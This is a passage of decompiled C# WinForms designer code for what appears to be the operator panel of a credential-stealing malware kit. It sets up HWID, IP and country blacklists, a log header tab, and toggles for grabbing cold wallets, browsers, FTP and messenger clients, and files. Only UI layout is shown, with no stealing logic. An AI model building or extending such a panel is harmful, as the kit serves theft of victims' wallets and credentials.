        ((System.Windows.Forms.Control)this.ff).Name = "label44";
        ((System.Windows.Forms.Control)this.ff).Size = new System.Drawing.Size(193, 30);
        ((System.Windows.Forms.Control)this.ff).TabIndex = 133;
        ((System.Windows.Forms.Control)this.ff).Text = "Black list HWIDs:";
        ((System.Windows.Forms.Label)this.ff).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.importIPs).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.importIPs).Location = new System.Drawing.Point(471, 401);
        ((System.Windows.Forms.Control)this.importIPs).Name = "importIPs";
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.importIPs).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).StyleManager = null;
        ((System.Windows.Forms.Control)this.importIPs).TabIndex = 132;
        ((System.Windows.Forms.Control)this.importIPs).Text = "From File";
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.importIPs).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.importIPs).Click += new System.EventHandler(importIPs_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.addBlackIPBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addBlackIPBtn).Location = new System.Drawing.Point(471, 427);
        ((System.Windows.Forms.Control)this.addBlackIPBtn).Name = "addBlackIPBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addBlackIPBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.addBlackIPBtn).TabIndex = 131;
        ((System.Windows.Forms.Control)this.addBlackIPBtn).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackIPBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.addBlackIPBtn).Click += new System.EventHandler(addBlackIPBtn_Click);
        ((GuiLib.AnimaTextBox)this.blackIPTb).Dark = false;
        ((System.Windows.Forms.Control)this.blackIPTb).Location = new System.Drawing.Point(353, 427);
        ((GuiLib.AnimaTextBox)this.blackIPTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.blackIPTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.blackIPTb).Name = "blackIPTb";
        ((GuiLib.AnimaTextBox)this.blackIPTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.blackIPTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.blackIPTb).Size = new System.Drawing.Size(112, 23);
        ((System.Windows.Forms.Control)this.blackIPTb).TabIndex = 130;
        ((GuiLib.AnimaTextBox)this.blackIPTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label23).AutoSize = true;
        ((System.Windows.Forms.Control)this.label23).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label23).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label23).Location = new System.Drawing.Point(350, 409);
        ((System.Windows.Forms.Control)this.label23).Name = "label23";
        ((System.Windows.Forms.Control)this.label23).Size = new System.Drawing.Size(66, 15);
        ((System.Windows.Forms.Control)this.label23).TabIndex = 129;
        ((System.Windows.Forms.Control)this.label23).Text = "Enter an IP:";
        ((System.Windows.Forms.Control)this.blackListIPsLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.blackListIPsLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.blackListIPsLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.m_a3;
        ((System.Windows.Forms.Control)this.blackListIPsLb).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.blackListIPsLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.blackListIPsLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.blackListIPsLb).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.blackListIPsLb).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.blackListIPsLb).Location = new System.Drawing.Point(353, 211);
        ((System.Windows.Forms.Control)this.blackListIPsLb).Name = "blackListIPsLb";
        ((System.Windows.Forms.Control)this.blackListIPsLb).Size = new System.Drawing.Size(193, 182);
        ((System.Windows.Forms.Control)this.blackListIPsLb).TabIndex = 128;
        ((System.Windows.Forms.Control)this.label24).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label24).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label24).Location = new System.Drawing.Point(353, 178);
        ((System.Windows.Forms.Control)this.label24).Name = "label24";
        ((System.Windows.Forms.Control)this.label24).Size = new System.Drawing.Size(193, 30);
        ((System.Windows.Forms.Control)this.label24).TabIndex = 127;
        ((System.Windows.Forms.Control)this.label24).Text = "Black list IPs:";
        ((System.Windows.Forms.Label)this.label24).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.addBlackCountryBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addBlackCountryBtn).Location = new System.Drawing.Point(241, 427);
        ((System.Windows.Forms.Control)this.addBlackCountryBtn).Name = "addBlackCountryBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addBlackCountryBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.addBlackCountryBtn).TabIndex = 126;
        ((System.Windows.Forms.Control)this.addBlackCountryBtn).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.addBlackCountryBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.addBlackCountryBtn).Click += new System.EventHandler(addBlackCountryBtn_Click);
        ((GuiLib.AnimaTextBox)this.blackCountryTb).Dark = false;
        ((System.Windows.Forms.Control)this.blackCountryTb).Location = new System.Drawing.Point(114, 427);
        ((GuiLib.AnimaTextBox)this.blackCountryTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.blackCountryTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.blackCountryTb).Name = "blackCountryTb";
        ((GuiLib.AnimaTextBox)this.blackCountryTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.blackCountryTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.blackCountryTb).Size = new System.Drawing.Size(112, 23);
        ((System.Windows.Forms.Control)this.blackCountryTb).TabIndex = 125;
        ((GuiLib.AnimaTextBox)this.blackCountryTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.blackCountryLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.blackCountryLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.blackCountryLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.blackCountryLbl).Location = new System.Drawing.Point(117, 409);
        ((System.Windows.Forms.Control)this.blackCountryLbl).Name = "blackCountryLbl";
        ((System.Windows.Forms.Control)this.blackCountryLbl).Size = new System.Drawing.Size(90, 15);
        ((System.Windows.Forms.Control)this.blackCountryLbl).TabIndex = 124;
        ((System.Windows.Forms.Control)this.blackCountryLbl).Text = "Enter a country:";
        ((System.Windows.Forms.Control)this.blackListLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.blackListLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.blackListLb).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_2;
        ((System.Windows.Forms.Control)this.blackListLb).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.blackListLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.blackListLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.blackListLb).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.blackListLb).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.blackListLb).Location = new System.Drawing.Point(114, 211);
        ((System.Windows.Forms.Control)this.blackListLb).Name = "blackListLb";
        ((System.Windows.Forms.Control)this.blackListLb).Size = new System.Drawing.Size(202, 182);
        ((System.Windows.Forms.Control)this.blackListLb).TabIndex = 123;
        ((System.Windows.Forms.Control)this.blackListLbl).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.blackListLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.blackListLbl).Location = new System.Drawing.Point(118, 178);
        ((System.Windows.Forms.Control)this.blackListLbl).Name = "blackListLbl";
        ((System.Windows.Forms.Control)this.blackListLbl).Size = new System.Drawing.Size(198, 30);
        ((System.Windows.Forms.Control)this.blackListLbl).TabIndex = 122;
        ((System.Windows.Forms.Control)this.blackListLbl).Text = "Black list countries:";
        ((System.Windows.Forms.Label)this.blackListLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.logHeaderTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.logHeaderTab).Controls.Add((System.Windows.Forms.Control)this.label2);
        ((System.Windows.Forms.Control)this.logHeaderTab).Controls.Add((System.Windows.Forms.Control)this.saveLogHeaderBtn);
        ((System.Windows.Forms.Control)this.logHeaderTab).Controls.Add((System.Windows.Forms.Control)this.logsHeaderTb);
        ((System.Windows.Forms.Control)this.logHeaderTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.logHeaderTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.logHeaderTab).Name = "logHeaderTab";
        ((System.Windows.Forms.Control)this.logHeaderTab).Padding = new System.Windows.Forms.Padding(3);
        ((System.Windows.Forms.Control)this.logHeaderTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.logHeaderTab).TabIndex = 20;
        ((System.Windows.Forms.Control)this.logHeaderTab).Text = "Log Header";
        ((System.Windows.Forms.Control)this.label2).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label2).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label2).Location = new System.Drawing.Point(259, 112);
        ((System.Windows.Forms.Control)this.label2).Name = "label2";
        ((System.Windows.Forms.Control)this.label2).Size = new System.Drawing.Size(140, 30);
        ((System.Windows.Forms.Control)this.label2).TabIndex = 119;
        ((System.Windows.Forms.Control)this.label2).Text = "Logs header:";
        ((System.Windows.Forms.Label)this.label2).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.saveLogHeaderBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveLogHeaderBtn).Location = new System.Drawing.Point(829, 414);
        ((System.Windows.Forms.Control)this.saveLogHeaderBtn).Name = "saveLogHeaderBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveLogHeaderBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.saveLogHeaderBtn).TabIndex = 118;
        ((System.Windows.Forms.Control)this.saveLogHeaderBtn).Text = "Save";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveLogHeaderBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.saveLogHeaderBtn).Click += new System.EventHandler(saveLogHeaderBtn_Click);
        ((GuiLib.AnimaTextBox)this.logsHeaderTb).Dark = false;
        ((System.Windows.Forms.Control)this.logsHeaderTb).Location = new System.Drawing.Point(264, 145);
        ((GuiLib.AnimaTextBox)this.logsHeaderTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.logsHeaderTb).MultiLine = true;
        ((System.Windows.Forms.Control)this.logsHeaderTb).Name = "logsHeaderTb";
        ((GuiLib.AnimaTextBox)this.logsHeaderTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.logsHeaderTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.logsHeaderTb).Size = new System.Drawing.Size(640, 263);
        ((System.Windows.Forms.Control)this.logsHeaderTb).TabIndex = 117;
        ((GuiLib.AnimaTextBox)this.logsHeaderTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.settingsTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label61);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.autoUpdatePanelCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.refresherLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.autoRefreshCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.resetDefaultSettingBtn);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.addNewBrowserExtBtn);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.newBrowserExtTb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label29);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.browsersExtensionsListBox);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label30);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.privateCreatorKeyTb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.showCreatorKeyBtn);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label7);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.metroSetButton4);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label45);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.discordCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.e5);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.e6);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.e7);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.ce);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.cf);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.d0);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.d1);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.c9);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.ca);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.cb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.cc);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.m_a5);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.m_a6);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.domainDetectorImportBtn);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.addDomainPatternBtn);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.domainDetectorTb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label5);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.cd);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.label6);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.pathsImportBtn);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.userAgentLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.blockEmptyLogsCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabColdWalletLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabColdWalletCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.duplicateLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.duplicateCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider10);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.saveSettingsBtn);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.addSearchPatternBtn);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.searchPatternTb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.searchPatternLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.getFilesSettingsLb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.getFilesSettingsLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabFilesLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabFilesCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabImClientsLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabImClientsCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabFtpsLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabFtpsCb);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabBrowsersLbl);
        ((System.Windows.Forms.Control)this.settingsTab).Controls.Add((System.Windows.Forms.Control)this.grabBrowsersCb);
        ((System.Windows.Forms.Control)this.settingsTab).Font = new System.Drawing.Font("Segoe UI", 9f);
        ((System.Windows.Forms.Control)this.settingsTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.settingsTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.settingsTab).Name = "settingsTab";
        ((System.Windows.Forms.Control)this.settingsTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.settingsTab).TabIndex = 5;
        ((System.Windows.Forms.Control)this.settingsTab).Text = "Settings";
        ((System.Windows.Forms.Control)this.label61).AutoSize = true;
        ((System.Windows.Forms.Control)this.label61).Font = new System.Drawing.Font("Segoe UI", 11.75f);
        ((System.Windows.Forms.Control)this.label61).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label61).Location = new System.Drawing.Point(288, 216);
        ((System.Windows.Forms.Control)this.label61).Name = "label61";
        ((System.Windows.Forms.Control)this.label61).Size = new System.Drawing.Size(142, 21);
        ((System.Windows.Forms.Control)this.label61).TabIndex = 151;
        ((System.Windows.Forms.Control)this.label61).Text = "Auto Update Panel:";
        ((System.Windows.Forms.Label)this.label61).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.autoUpdatePanelCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.autoUpdatePanelCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.autoUpdatePanelCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.autoUpdatePanelCb).Location = new System.Drawing.Point(468, 221);
        ((System.Windows.Forms.Control)this.autoUpdatePanelCb).Name = "autoUpdatePanelCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.autoUpdatePanelCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoUpdatePanelCb).Style = MetroSet_UI.Design.Style.Dark;
